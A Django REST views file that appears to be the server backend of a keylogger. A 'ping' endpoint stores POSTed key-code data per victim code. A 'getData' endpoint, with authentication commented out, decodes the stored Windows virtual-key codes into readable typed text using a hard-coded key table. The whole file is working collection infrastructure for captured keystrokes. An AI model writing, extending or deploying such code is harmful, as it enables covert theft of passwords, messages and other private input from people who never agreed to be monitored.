
from rest_framework.response import Response
from rest_framework.decorators import api_view
from rest_framework import status
# models
from .models import Log
# serializers
from .serializers import LogSerializer, GetLogSerializer

KEYS = [
    # from 0 to 9
    [0x30, '0'],
    [0x31, '1'],
    [0x32, '2'],
    [0x33, '3'],
    [0x34, '4'],
    [0x35, '5'],
    [0x36, '6'],
    [0x37, '7'],
    [0x38, '8'],
    [0x39, '9'],
    # from A to Z
    [0x41, 'a'],
    [0x42, 'b'],
    [0x43, 'c'],
    [0x44, 'd'],
    [0x45, 'e'],
    [0x46, 'f'],
    [0x47, 'g'],
    [0x48, 'h'],
    [0x49, 'i'],
    [0x4A, 'j'],
    [0x4B, 'k'],
    [0x4C, 'l'],
    [0x4D, 'm'],
    [0x4E, 'n'],
    [0x4F, 'o'],
    [0x50, 'p'],
    [0x51, 'q'],
    [0x52, 'r'],
    [0x53, 's'],
    [0x54, 't'],
    [0x55, 'u'],
    [0x56, 'v'],
    [0x57, 'w'],
    [0x58, 'x'],
    [0x59, 'y'],
    [0x5A, 'z'],
    # BACKSPACE
    [0x08, '[BACK]'],
    # TAB
    [0x09, '[TAB]'],
    # ENTER
    [0x0D, '[ENTER]'],
    # SHIFT
    [0x10, '[SHIFT]'],
    # CAPS LOCK
    [0x14, '[CAPS]'],
]

@api_view(['GET', 'POST'])
def ping(request):
    if request.method == 'GET':
        return Response(status=status.HTTP_200_OK)

    if request.method == 'POST':
        print(request.data)
        print(request.headers)

        # check if data is more than 255 characters
        if len(request.data["data"]) > 255:
            request.data["data"] = request.data["data"][:255]
            request.data["is_overloaded"] = True


        logSerilizer = LogSerializer(data=request.data)
        if logSerilizer.is_valid():
            logSerilizer.save()
            return Response(status=status.HTTP_200_OK)
        return Response(logSerilizer.errors, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET'])
# @permission_classes([IsAuthenticated])
def getData(request, code):
    query = Log.objects.filter(code=code)

    logSerializer = GetLogSerializer(query, many=True)
    for l in logSerializer.data:
        data = l["data"].split(',')
        humanReadableData = ""
        for d in data:
            for k in KEYS:
                if d != '' and k[0] == int(d):
                    humanReadableData += k[1]
                    break
            
        l["hr"] = humanReadableData
    return Response(logSerializer.data, status=status.HTTP_200_OK)

